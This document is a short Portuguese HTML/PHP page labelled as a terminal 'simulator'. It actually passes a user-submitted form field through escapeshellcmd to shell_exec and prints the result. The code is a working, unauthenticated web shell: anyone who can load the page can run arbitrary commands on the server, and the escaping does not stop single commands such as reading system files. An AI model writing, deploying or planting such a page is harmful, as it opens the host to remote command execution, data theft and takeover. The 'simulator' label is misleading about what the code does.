<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Terminal PHP</title>
    <style>
        body {
            font-family: monospace;
            background-color: #222;
            color: #fff;
            padding: 20px;
        }
        textarea {
            width: 100%;
            height: 200px;
            background-color: #333;
            color: #fff;
            border: none;
            padding: 10px;
        }
    </style>
</head>
<body>
    <h1>Simulador de Terminal PHP</h1>
    
    <form method="POST">
        <textarea name="comando" placeholder="Digite seu comando aqui..."></textarea>
        <br>
        <button type="submit">Executar</button>
    </form>

    <h2>Saída:</h2>
    <pre>
    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Capturando o comando do usuário
        $comando = escapeshellcmd(trim($_POST['comando']));

        // Executando o comando e capturando a saída
        $saida = shell_exec($comando);

        // Exibindo a saída
        echo htmlspecialchars($saida);
    }
    ?>
    </pre>
</body>
</html>
